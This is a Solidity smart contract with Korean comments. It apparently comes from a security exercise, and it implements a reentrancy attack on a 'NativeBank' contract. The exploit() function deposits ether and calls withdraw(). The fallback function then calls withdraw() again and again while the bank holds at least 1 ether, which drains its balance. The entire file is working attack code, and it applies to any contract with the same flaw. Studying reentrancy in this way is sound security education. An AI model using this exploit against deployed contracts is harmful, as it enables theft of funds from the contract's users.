// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface INativeBank {
    function withdraw() external;
}

contract Exploit {
    INativeBank nb;
    constructor(INativeBank _nb) {
        nb = _nb;
    }

    // NativeToken을 보낸다는 의미로 payable을 사용
    function exploit() external payable {
        (bool success, ) = address(nb).call{value: msg.value}(""); // NativeBank의 receive()를 호출
        require(success, "failed to staking");
        nb.withdraw(); // Interface를 통해 NativeBank의 withdraw()를 호출
    }

    fallback() external payable { // receive -> fallback (receive가 없을 때)
        // NativeBank의 withdraw()가 호출되면 이곳으로 들어온다.
        if (address(nb).balance >= 1*10**18) { // 1 ether 이상일 때
            nb.withdraw(); // NativeBank의 withdraw()를 또 호출
        }
    }
}
